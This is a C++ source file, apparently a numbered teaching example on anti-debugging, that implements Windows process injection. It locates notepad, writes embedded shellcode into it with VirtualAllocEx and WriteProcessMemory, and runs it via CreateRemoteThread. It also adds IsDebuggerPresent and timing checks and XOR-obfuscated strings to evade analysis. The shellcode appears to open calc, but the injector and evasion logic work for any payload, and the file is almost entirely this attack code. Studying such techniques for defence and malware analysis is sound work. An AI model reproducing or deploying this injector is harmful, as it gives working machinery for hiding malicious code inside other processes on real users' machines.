// Example 5 - Anti-Debug.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
#include <wingdi.h>
#include <time.h>
#include <Shlobj.h> 


using namespace std;
char shellcode[] = "\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7";


HANDLE FindRunningProcess(LPSTR processName) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		//cout << "Failed to create snapshot" << endl;
		return INVALID_HANDLE_VALUE;
	}
	if (!Process32First(hProcessSnap, &pe32)) {
		//cout << "Failed to get first process" << endl;
		CloseHandle(hProcessSnap);
		return INVALID_HANDLE_VALUE;
	}
	do {
		//cout << "Process Id:" << pe32.th32ProcessID << endl;
		//cout << "Parent Id:" << pe32.th32ParentProcessID << endl;
		LPSTR buffer = new CHAR[MAX_PATH];
		DWORD value = MAX_PATH;
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
		QueryFullProcessImageNameA(hProcess, 0, buffer, &value);
		cout << buffer << endl;;
		if (strstr(buffer, processName)) {
			//cout << "Found a notepad" << endl;
			return hProcess;
		}
		cout << endl;

	} while (Process32Next(hProcessSnap, &pe32));
	return INVALID_HANDLE_VALUE;
}

BOOL checkTiming(time_t start) {
	double seconds_since_start = difftime(time(0), start);
	if (seconds_since_start > 1) {
		return TRUE;
	}
	return FALSE;
}

string encryptDecrypt(string toEncrypt) {
	//char key = 'Z'; //Any char will work
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ 0x5a;

	return output;
}



int main()
{
	
	if (IsDebuggerPresent()) {
		return -1;
	}

	char processName[] = "\x34\x35\x2e\x3f\x2a\x3b\x3e\x5a";
	time_t start = time(0);
	string pName = encryptDecrypt(processName);
	if (checkTiming(start)) {
		return -1;
	}

	HANDLE p = FindRunningProcess((LPSTR) pName.c_str());
	if (p == INVALID_HANDLE_VALUE) {
		//cout << "Failed to find notepad" << endl;
		return -1;
	}
	else {
		//cout << "Found notepad!" << endl;
	}
	
	start = time(0);
	LPVOID MyFuncAddress = VirtualAllocEx(p, NULL, 258, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (checkTiming(start)) {
		return -1;
	}

	if (IsDebuggerPresent()) {
		return -1;
	}

	start = time(0);
	WriteProcessMemory(p, MyFuncAddress, (void*)shellcode, 258, NULL);
	if (checkTiming(start)) {
		return -1;
	}

	if (IsDebuggerPresent()) {
		return -1;
	}

	start = time(0);
	HANDLE thread = CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)MyFuncAddress, 0, 0, NULL);
	if (checkTiming(start)) {
		return -1;
	}
	if (IsDebuggerPresent()) {
		return -1;
	}

	if (thread != 0) {

		WaitForSingleObject(thread, INFINITE);   

		CloseHandle(thread);
		CloseHandle(p);  
	
	}
	else {
		char output[] = "\x1f\x28\x28\x35\x28\x7b\x5a";
		string output_ = encryptDecrypt(output);
		cout << output_ << endl;
	}

	char command[] = "\x0a\x1b\x0f\x09\x1f\x5a";
	string command_ = encryptDecrypt(command);
	system(command_.c_str());
	return EXIT_SUCCESS;


}


